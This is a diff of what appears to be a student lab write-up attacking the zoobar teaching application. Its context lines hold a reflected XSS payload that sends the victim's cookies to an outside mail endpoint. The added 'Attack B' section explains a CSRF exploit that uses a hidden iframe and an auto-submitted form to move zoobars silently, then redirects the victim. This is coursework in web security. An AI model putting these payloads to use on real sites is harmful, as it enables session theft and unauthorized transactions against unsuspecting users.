@@ -34,6 +34,38 @@ http://zoobar.org/users.php?user=\"\>\<script\>new\ Image().src\=\'http\:\/\/zoo
 
 http://zoobar.org/users.php?user=\%22\%3E\%3Cscript\%3Enew\%20Image().src\%3D\%27http\%3A\%2F\%2Fzoomail.org\%2Fsendmail.php\%3Fnetid\%3Dpmcollins2\%26payload\%3D\%27\%2Bdocument.cookie\%2B\%27\%26random\%3D\%27\%2BMath.random()\%3Bdocument.location\%3D\%27\%2Fusers.php\%27\%3B\%3C\%2Fscript\%3E
 
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+Attack B
+
+The goal of this attack was to create an HTML document that, when loaded in a 
+browser, will transfer 10 zoobars from the user's account (if logged in) to the
+attacker's account.  It then will redirect the browser to the course webpage so
+that the user will not notice the transfer.
+
+In order to accomplish this, we had to convince the browser to send a malicious
+transfer request to zoobar.org/transfer.php.  This was done by creating a form
+with the action attribute set to the transfer url.  In order for the user not to
+see the form, we set the target attribute to be an invisible iframe called "frame".
+	<iframe id="frame" name="frame" style="visibility: hidden"></iframe>
+	<form id="attack" method="POST" target="frame" action="http://zoobar.org/transfer.php">
+
+To set up the transfer of zoobars, we set the following values of the transfer form,
+taken from the transfer.php code for zoobar:
+	<input name="zoobars" type="hidden" value="10">
+	<input name="recipient" type="hidden" value="attacker">
+
+To submit the form without any user interaction, we used the window.onload property.
+We created a function that will run when the window loads and when the form is
+submitted.  The first time the function is called, we only want to click the send
+button:
+	document.getElementById('send').click();
+
+The second time the function is called, we want to redirect the browser to the 
+course webpage, which we do by changing the document.location property:
+	document.location='http://pages.cs.wisc.edu/~rist/642-spring-2014/';
+
+This successfully completes the attack.
+
 
 ~~~~~~~~~~~~~~~~~~~~~~~~~~~~
 Attack C
